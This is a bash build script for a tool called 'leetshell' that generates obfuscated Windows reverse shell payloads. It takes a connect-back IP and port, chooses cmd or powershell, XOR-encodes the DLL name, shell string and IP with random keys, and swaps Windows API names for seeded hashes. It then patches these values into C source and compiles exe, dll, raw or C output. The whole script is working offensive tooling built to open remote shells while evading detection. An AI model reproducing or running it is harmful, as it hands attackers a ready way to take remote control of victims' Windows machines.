#!/usr/bin/env bash
set -euo pipefail


# Config / defaults
filename="src/leetshell.c"
ip=""
port=""
shell_type="cmd"
format="c"
output=""
# Generated globals
xor_key1= xor_key2= xor_key3=
xor_hex1= xor_hex2= xor_hex3=
seed= mask=
declare -a apis=("LoadLibraryA" "CreateProcessA" "WSAStartup" "WSASocketA" "connect")

usage() {
  cat << EOF
Usage: 
   $0 [-h] -i IP -p PORT [-t TYPE] [-f FORMAT] [-o OUTPUT]

Options:
  -i, --ip        IP address
  -p, --port      listening port
  -t, --type      shell type {cmd, powershell}
  -f, --format    payload format {c, exe, dll, raw}
  -o, --output    output path
  -h, --help      show this help message
EOF
  exit 1
}

print_banner() {
  printf '%b\n' "[31m
██╗     ███████╗███████╗████████╗ ███████╗██╗  ██╗███████╗██╗     ██╗      
██║     ██╔════╝██╔════╝╚══██╔══╝ ██╔════╝██║  ██║██╔════╝██║     ██║ 
██║     █████╗  █████╗     ██║    ███████╗███████║█████╗  ██║     ██║      
██║     ██╔══╝  ██╔══╝     ██║    ╚════██║██╔══██║██╔══╝  ██║     ██║ 
███████╗███████╗███████╗   ██║    ███████║██║  ██║███████╗███████╗███████╗ 
╚══════╝╚══════╝╚══════╝   ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
[33m Copyright © 2025 jarednexgent (https://github.com/jarednexgent) [0m 
"
}

# -------- argument parsing --------
parse_args() {
  [[ $# -gt 0 ]] || usage
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -h|--help) usage ;;
      -i|--ip)
        if [[ -n "${2:-}" && "$2" != -* ]]; then ip="$2"; shift 2; else echo "[!] $1 requires an argument"; echo; usage; fi
        ;;
      -p|--port)
        if [[ -n "${2:-}" && "$2" != -* ]]; then port="$2"; shift 2; else echo "[!] $1 requires an argument"; echo; usage; fi
        ;;
      -t|--type)
        if [[ -n "${2:-}" && "$2" != -* ]]; then shell_type="$2"; shift 2; else echo "[!] $1 requires an argument"; echo; usage; fi
        ;;
      -f|--format)
        if [[ -n "${2:-}" && "$2" != -* ]]; then format="$2"; shift 2; else echo "[!] $1 requires an argument"; echo; usage; fi
        ;;
      -o|--output)
        if [[ -n "${2:-}" && "$2" != -* ]]; then output="$2"; shift 2; else echo "[!] $1 requires an argument"; echo; usage; fi
        ;;
      --) shift; break ;;
      -*)
        echo "[!] Unknown option: $1"; echo; usage ;;
      *)
        echo "[!] Unknown option: $1"; echo; usage ;;
    esac
  done
}

validate_inputs() {
  if [[ -z "$ip" || -z "$port" ]]; then
    echo "[!] IP and PORT are required."; usage
  fi

  if ! [[ "$port" =~ ^[0-9]+$ ]]; then
    echo "[!] Port must be numeric: $port"; usage
  fi

  case "$shell_type" in
    cmd|powershell) : ;;
    *) echo "[!] Unknown shell type: $shell_type (allowed: cmd, powershell)"; usage ;;
  esac

  case "$format" in
    c|exe|dll|raw) : ;;
    *) echo "[!] Invalid format: $format (allowed: c, exe, dll, raw; default: c)"; usage ;;
  esac
}

# -------- key/hash generation & patching --------
gen_xor_keys() {
  xor_key1=$((RANDOM % 256)); xor_hex1=$(printf '0x%02x' "$xor_key1")
  xor_key2=$((RANDOM % 256)); xor_hex2=$(printf '0x%02x' "$xor_key2")
  xor_key3=$((RANDOM % 256)); xor_hex3=$(printf '0x%02x' "$xor_key3")
}

patch_keys_in_source() {
  sed -i "s/^#define KEY1.*/#define KEY1 $xor_hex1/" "$filename"
  sed -i "s/^#define KEY2.*/#define KEY2 $xor_hex2/" "$filename"
  sed -i "s/^#define KEY3.*/#define KEY3 $xor_hex3/" "$filename"
}

gen_seed_and_hashes() {
  seed=$(( (RANDOM % 255) + 1 ))
  mask=$((0xFFFFFFFF))

  # hash function uses globals seed+mask
  hash_loselose() {
    local s="$1" h=0 b
    while IFS= read -r b; do
      (( h = (h + b) & mask ))
      (( h = ( h * (b + seed) ) & mask ))
    done < <(printf '%s' "$s" | LC_ALL=C od -An -t u1 -v | tr -s ' ' '\n' | sed '/^$/d')
    if (( h < 0 )); then
      printf '%u' "$(( h & mask ))"
    else
      printf '%u' "$h"
    fi
  }

  for sym in "${apis[@]}"; do
    val="$(hash_loselose "$sym")"
    printf -v "$sym" '%u' "$val"
    export "$sym"
  done
}

patch_hashes_in_source() {
  sed -i "s/^#define SEED.*/#define SEED                $seed/" "$filename"
  sed -i "s/^#define LOADLIBRARYA_H.*/#define LOADLIBRARYA_H      $LoadLibraryA/" "$filename"
  sed -i "s/^#define CREATEPROCESSA_H.*/#define CREATEPROCESSA_H    $CreateProcessA/" "$filename"
  sed -i "s/^#define WSASTARTUP_H.*/#define WSASTARTUP_H        $WSAStartup/" "$filename"
  sed -i "s/^#define WSASOCKETA_H.*/#define WSASOCKETA_H        $WSASocketA/" "$filename"
  sed -i "s/^#define CONNECT_H.*/#define CONNECT_H           $connect/" "$filename"
}

# -------- encoders / formatters --------
encode_ws2_string() {
  local ws2="ws2_32.dll"
  local enc="{"
  local i byte xor_byte
  for (( i=0; i<${#ws2}; i++ )); do
    byte=$(printf "%d" "'${ws2:$i:1}")
    xor_byte=$((byte ^ xor_key1))
    enc+=$(printf "0x%02x, " "$xor_byte")
  done
  enc+=$(printf "0x%02x" "$xor_key1")
  enc+="}"
  printf '%s' "$enc"
}

format_and_validate_ip() {
  # ensure IPv4 and range
  IFS=. read -r o0 o1 o2 o3 <<< "$ip" || { echo "Invalid IPv4: $ip" >&2; exit 1; }
  for o in "$o0" "$o1" "$o2" "$o3"; do
    [[ "$o" =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || { echo "Invalid IPv4: $ip" >&2; exit 1; }
  done

  # XOR each octet with xor_key2 and format array (keeps original behaviour)
  local k=$(( xor_key2 & 0xFF ))
  local b0=$(( (10#$o0 ^ k) & 0xFF ))
  local b1=$(( (10#$o1 ^ k) & 0xFF ))
  local b2=$(( (10#$o2 ^ k) & 0xFF ))
  local b3=$(( (10#$o3 ^ k) & 0xFF ))
  printf -v ip_array "{0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x}" "$b0" "$b1" "$b2" "$b3" "$k"
}

encode_shell_string() {
  if [ "$shell_type" == "cmd" ]; then
    shell_str="cmd"
  else
    shell_str="powershell"
  fi
  local enc="{"
  local i byte xor_byte
  for (( i=0; i<${#shell_str}; i++ )); do
    byte=$(printf "%d" "'${shell_str:$i:1}")
    xor_byte=$((byte ^ xor_key3))
    enc+=$(printf "0x%02x, " "$xor_byte")
  done
  enc+=$(printf "0x%02x" "$xor_key3")
  enc+="}"
  printf '%s' "$enc"
}

# -------- patch source and build --------
patch_source_values() {
  local ws2_enc shell_enc ip_arr
  ws2_enc="$(encode_ws2_string)"
  shell_enc="$(encode_shell_string)"
  ip_arr="$ip_array"

  sed -i "s/char cmd\[\] = .*;/char cmd[] = $shell_enc;/" "$filename"
  sed -i "s/char ws2_32_dll\[\] = .*;/char ws2_32_dll[] = $ws2_enc;/" "$filename"
  sed -i "s/unsigned char ip\[\] = .*;/unsigned char ip\[\] = $ip_arr;/g" "$filename"
  sed -i "s/int port =.*;/int port = $port ;/g" "$filename"
}

build_targets() {
  make -C src leetshell > /dev/null 2>&1
  if [[ $? -ne 0 ]]; then
    echo "[!] Build failed!"
    exit 1
  fi

  # normalize output path
  local out_abs=""
  if [[ -n "$output" ]]; then
    case "$output" in
      /*) out_abs="$output" ;;
      *)  out_abs="$(readlink -f -- "$output")" ;;
    esac
  fi

  case "${format,,}" in
    raw) make -s -C src raw OUTPUT="$out_abs" ;;
    exe) make -s -C src exe OUTPUT="$out_abs" ;;
    c)   make -s -C src c   OUTPUT="$out_abs" ;;
    dll) make -s -C src dll OUTPUT="$out_abs" ;;
    *)   echo "[!] invalid format: $format"; exit 1 ;;
  esac
}

cleanup_artifacts() {
  make -C src clean > /dev/null 2>&1 || true
}

# -------- main flow --------
main() {
  print_banner
  parse_args "$@"
  validate_inputs

  gen_xor_keys
  patch_keys_in_source

  gen_seed_and_hashes
  patch_hashes_in_source

  # encoders / formatters
  local ws2_enc shell_enc
  ws2_enc="$(encode_ws2_string)"   # used inside patch_source_values
  format_and_validate_ip
  shell_enc="$(encode_shell_string)"

  # patch values into C source
  patch_source_values

  # perform build steps and produce output
  build_targets

  # cleanup
  cleanup_artifacts
}

main "$@"
